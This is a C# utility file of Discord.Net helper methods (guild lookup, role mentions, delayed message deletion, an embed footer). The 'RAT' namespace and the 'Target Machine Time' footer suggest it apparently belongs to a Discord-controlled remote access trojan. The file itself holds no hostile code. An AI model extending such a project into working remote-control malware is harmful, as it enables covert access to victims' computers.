using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;

namespace RAT;

public static class Utils
{
    public static SocketGuild GetGuild<T>(this T channelSocket) where T : ISocketMessageChannel
    {
        try
        {
#pragma warning disable CS8600

            if (channelSocket is not SocketGuildChannel gChan)
            {
                throw new InvalidOperationException("Channel does not point to a valid guild!");
            }

            return gChan.Guild;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An exception occured while attempting to get the guild of channel with id -> {channelSocket.Id}. \r\n\r\nException -> {ex}");
            throw;
        }
    }
    public static SocketGuildUser GetGuildUser<T>(this T userSocket) where T : IUser
        => (userSocket as SocketGuildUser)!;
    public static async Task<List<String>> GetRoleMentions(this SocketRole[] roles)
    {
        List<String> names = new();
        await Task.Run(
        () =>
        {
            for (int i = 0; i < roles.Length; i++)
            {
                names.Add(roles[i].Mention);
            }
        });
        return names;
    }
    public static Task<bool> HasRole(this SocketGuildUser user, SocketRole role)
        => Task.Run(() => user.Roles.Contains(role));

    /// <summary>
    /// Deletes a message in an asynchrownous manner
    /// </summary>
    /// <param name="msg">The message socket</param>
    /// <param name="delay">The delay in milliseconds in which the message should be deleted.</param>
    /// <returns>a Task representing the operation.</returns>
    internal static Task MessageDeleter<T>(this T msg, int delay = 5000) where T : IMessage =>
        Task.Run(async () =>
        {
            await Task.Delay(delay);
            await msg.DeleteAsync();
        });
    internal static EmbedFooterBuilder GetTimeFooter()
        => new() { Text = $"Target Machine Time | {DateTime.Now}" };
}